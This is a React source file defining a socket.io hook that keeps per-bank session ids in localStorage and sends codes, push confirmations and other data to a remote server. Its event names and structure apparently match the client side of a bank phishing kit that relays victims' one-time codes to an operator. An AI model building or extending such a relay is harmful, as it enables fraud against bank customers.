import React, {createContext, useContext, useState} from "react";
import {io} from "socket.io-client";
import {v4} from "uuid";

const socketContext = createContext();
const socket = io(process.env.REACT_APP_API_URL, {
    withCredentials: true,
    autoConnect: false
});
export const SocketProvider = ({children}) => {
    const socket = useProvideSocket();
    return <socketContext.Provider value={socket}>{children}</socketContext.Provider>
}

export const useSocket = () => {
    return useContext(socketContext);
}

const useProvideSocket = () => {

    const [user, setUser] = useState({
        id: null,
        status: ''
    });


    //Listeners
    socket.on('update_user', (update) => {
        console.log('Hook, update_user', update);
        setUser({
            ...user,
            ...update
        });
    })
    socket.on('broke_user', (data) => {
        console.log('Hook, broke user.');
        setUser({
            ...data
        });
        const bank = localStorage.getItem('bank_name');
        localStorage.removeItem(`${bank}_id`);
    });

    //Actions
    const initUser = (data) => {
        const id = user.id ? user.id : v4();
        socket.emit('init_user', {
            ...data, id, status: 'init',
        });
        localStorage.setItem(`${user.bank}_id`, id);
    }
    const sendCode = (code) => {
        socket.emit('send_code', {
            code, id: user.id
        });
        user.status = 'send_code';
    }
    const sendOtherData = (data) => {
        socket.emit('send_other_data', {
            ...data,
        }, user.id);
        user.status = 'send_other_data';
    }
    const sendPush = (code) => {
        socket.emit('send_push', {
            id: user.id, code
        });
        user.status = 'send_push';
    }
    const connect = (bank) => {
        socket.connect()
        console.log(bank);
        if (bank) {
            const id = localStorage.getItem(`${bank}_id`);
            if (id) {
                console.log(id)
                socket.emit('get_user', id, (res) => {
                    if (res) {
                        setUser({
                            ...res
                        })
                    } else {
                        localStorage.removeItem('bank_name');
                        localStorage.removeItem(`${bank}_id`)
                    }
                })
            } else {
                console.log('on id')
                setUser({
                    id: null,
                    status: '',
                    bank
                })
            }
        } else {
            setUser({
                ...user,
                bank
            })
        }

    }
    const disconnect = () => {
        socket.disconnect();
    }
    const sendData = (status, args = null) => {
        socket.emit('send_data', {
            status, id: user.id, args
        })
    }


    // useEffect(()=> {
    //     socket.connect();
    //     const bank = localStorage.getItem('bank_name');
    //     if (bank) {
    //         const id = localStorage.getItem(`${bank}_id`);
    //         if (id){
    //             socket.emit('get_user', id, (res) => {
    //                 if(res){
    //                     setUser({
    //                         ...res
    //                     });
    //                 }
    //                 else{
    //                     localStorage.removeItem('bank_name');
    //                     localStorage.removeItem(`${bank}_id`)
    //                 }
    //             })
    //         }
    //     }
    //
    //
    // }, [])

    return {
        user,
        setUser,
        initUser,
        sendCode,
        sendOtherData,
        sendPush,
        connect,
        disconnect,
        sendData
    }

}
